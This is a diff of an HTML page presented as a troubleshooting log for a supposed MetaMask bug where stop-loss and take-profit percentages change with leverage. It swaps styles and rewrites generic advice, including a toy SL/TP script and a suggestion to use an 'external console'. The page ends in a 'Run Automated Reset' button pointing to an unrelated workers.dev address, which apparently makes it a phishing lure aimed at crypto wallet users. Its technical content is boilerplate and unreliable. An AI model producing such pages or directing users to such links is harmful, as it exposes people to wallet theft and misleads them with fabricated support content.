@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #0f111a;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,33 +42,36 @@
 <h1>Metamask Extension Bug Sl Tp Percentages Change When Changing L</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users notice that the Stop Loss (SL) and Take Profit (TP) percentages in Metamask Extension are changing unexpectedly when they adjust the leverage, rather than remaining constant as expected.</li>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem experience unexpected changes in Stop-Loss (SL) and Take-Profit (TP) percentages when adjusting leverage levels.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask Extension's code that handles leverage adjustments, which inadvertently alters the SL and TP percentages. This is likely caused by a miscalculation in the extension's algorithm for recalibrating these values when leverage is modified.</li>
+<li>The issue arises from a bug within the Metamask extension, where the calculation logic for SL and TP percentages is inadvertently linked to the leverage setting, causing these percentages to fluctuate when the leverage is changed.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To bypass this issue, users can attempt the following manual overrides:</li>
-<li>Manually re-enter the desired SL and TP percentages after adjusting the leverage.</li>
-<li>Utilize a third-party calculator to determine the correct SL and TP values based on the adjusted leverage.</li>
-<li>Implement a custom script to automatically adjust the SL and TP percentages according to the leverage, using a code block such as:
-  <code>bash
-  const calculateSLTP = (leverage, slPercent, tpPercent) =&gt; {
-    const sl = (slPercent / 100) * leverage;
-    const tp = (tpPercent / 100) * leverage;
-    return { sl, tp };
-  };</code>
-  Consider using an external console to execute the custom script for more precise control.</li>
+<li>To temporarily mitigate this issue, users can attempt the following manual overrides:</li>
+<li>Adjust the SL and TP percentages manually after changing the leverage to ensure they reflect the intended values.</li>
+<li>Utilize external calculation tools to determine the correct SL and TP percentages based on the desired leverage and input these values into the Metamask extension.</li>
+<li>Implement a custom script to automate the adjustment of SL and TP percentages in response to leverage changes, such as:</li>
 </ul>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># Example script to adjust SL and TP percentages</span>
+<span class="nv">LEVERAGE</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nv">SL_PERCENTAGE</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;scale=2; </span><span class="nv">$LEVERAGE</span><span class="s2"> * 0.05&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>bc<span class="k">)</span>
+<span class="nv">TP_PERCENTAGE</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;scale=2; </span><span class="nv">$LEVERAGE</span><span class="s2"> * 0.10&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>bc<span class="k">)</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Adjusted SL Percentage: </span><span class="nv">$SL_PERCENTAGE</span><span class="s2">&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Adjusted TP Percentage: </span><span class="nv">$TP_PERCENTAGE</span><span class="s2">&quot;</span>
+</code></pre></div>
+
+<p>Consider utilizing an external console for more complex scripting needs.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask Extension installed and configured</li>
-<li>Basic understanding of leverage and SL/TP percentages</li>
-<li>Familiarity with JavaScript or a similar programming language</li>
+<li>Metamask extension installed and configured.</li>
+<li>Basic understanding of leverage and SL/TP percentages in trading.</li>
+<li>Familiarity with command-line interfaces for manual overrides.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
